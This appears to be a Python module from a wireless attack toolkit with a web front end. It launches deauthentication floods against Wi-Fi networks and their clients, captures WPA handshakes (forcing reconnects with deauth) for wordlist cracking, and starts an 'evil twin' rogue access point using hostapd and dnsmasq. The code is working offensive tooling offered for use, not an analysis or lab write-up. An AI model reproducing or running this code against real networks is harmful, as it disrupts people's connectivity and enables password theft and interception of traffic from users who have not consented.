import os
import threading
import time
import sys
from web.shared import *

# Add the project root directory to Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from utils.network_utils import set_monitor_mode, set_managed_mode
from attacks.deauth_attack import deauth_worker
from attacks.capture_attack import capture_worker
from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network

def update_progress(progress):
    attack_state['progress'] = min(100, max(0, progress))

def launch_deauth_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    client = attack_config.get('client', 'FF:FF:FF:FF:FF:FF')
    count = attack_config.get('count', 10)
    interval = attack_config.get('interval', 0.1)
    
    # Set monitor mode
    set_monitor_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to monitor mode")
    
    # Set channel
    try:
        os.system(f"iwconfig {config['interface']} channel {channel}")
        log_message(f"Channel set to {channel}")
    except Exception as e:
        log_message(f"Error setting channel: {e}")
        set_managed_mode(config['interface'])
        raise
    
    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, client, config['interface'], count, interval, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].append(deauth_thread)
    deauth_thread.start()
    log_message("Deauthentication attack started")

def launch_handshake_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    duration = attack_config.get('duration', 5)
    wordlist = attack_config.get('wordlist', config['wordlist'])
    
    # Create output directory
    safe_bssid = bssid.replace(':', '-')
    output_dir = os.path.join(config['output_dir'], safe_bssid)
    os.makedirs(output_dir, exist_ok=True)
    cap_file = os.path.join(output_dir, "capture-01.cap")
    
    # Set monitor mode
    set_monitor_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to monitor mode")
    
    # Start capture thread
    capture_thread = threading.Thread(
        target=capture_worker,
        args=(bssid, channel, config['interface'], duration, 
              os.path.join(output_dir, "capture"), cap_file, wordlist, 
              attack_state['stop_event']),
        daemon=True
    )
    
    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, "FF:FF:FF:FF:FF:FF", config['interface'], 10, 0.1, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].extend([capture_thread, deauth_thread])
    capture_thread.start()
    log_message("Handshake capture started")
    
    # Wait a bit before starting deauth
    time.sleep(2)
    deauth_thread.start()
    log_message("Deauthentication flood started")
    
    # Update stats when a handshake is captured
    stats['captures_count'] += 1

def launch_evil_twin_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    ssid = network['essid']
    channel = attack_config.get('channel', int(network['channel']))
    captive_portal = attack_config.get('captive_portal', False)
    
    # Create output directory
    safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
    output_dir = os.path.join(config['output_dir'], "evil_twin", safe_ssid)
    os.makedirs(output_dir, exist_ok=True)
    
    # Set managed mode
    set_managed_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to managed mode")
    
    # Create config files
    hostapd_conf = create_hostapd_config(config['interface'], ssid, channel)
    dnsmasq_conf = create_dnsmasq_config(config['interface'])
    
    if hostapd_conf and dnsmasq_conf:
        # Setup network
        setup_fake_ap_network(config['interface'])
        log_message("Fake AP network setup complete")
        
        # Start hostapd
        hostapd_thread = threading.Thread(
            target=run_hostapd,
            args=(hostapd_conf, attack_state['stop_event']),
            daemon=True
        )
        
        # Start dnsmasq
        dnsmasq_thread = threading.Thread(
            target=run_dnsmasq,
            args=(dnsmasq_conf, attack_state['stop_event']),
            daemon=True
        )
        
        attack_state['threads'].extend([hostapd_thread, dnsmasq_thread])
        hostapd_thread.start()
        dnsmasq_thread.start()
        log_message("Evil Twin attack started")
        
        # Start captive portal if enabled
        if captive_portal:
            # This would be implemented in a real scenario
            log_message("Captive portal functionality not implemented yet")
    else:
        raise Exception("Failed to create required configuration files")

def run_hostapd(config_file, stop_event):
    try:
        log_message(f"Starting hostapd with config: {config_file}")
        process = os.popen(f"hostapd {config_file}")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                log_message(f"[hostapd] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        log_message(f"Error in hostapd: {e}")

def run_dnsmasq(config_file, stop_event):
    try:
        log_message(f"Starting dnsmasq with config: {config_file}")
        process = os.popen(f"dnsmasq -C {config_file} -d")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                log_message(f"[dnsmasq] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        log_message(f"Error in dnsmasq: {e}")
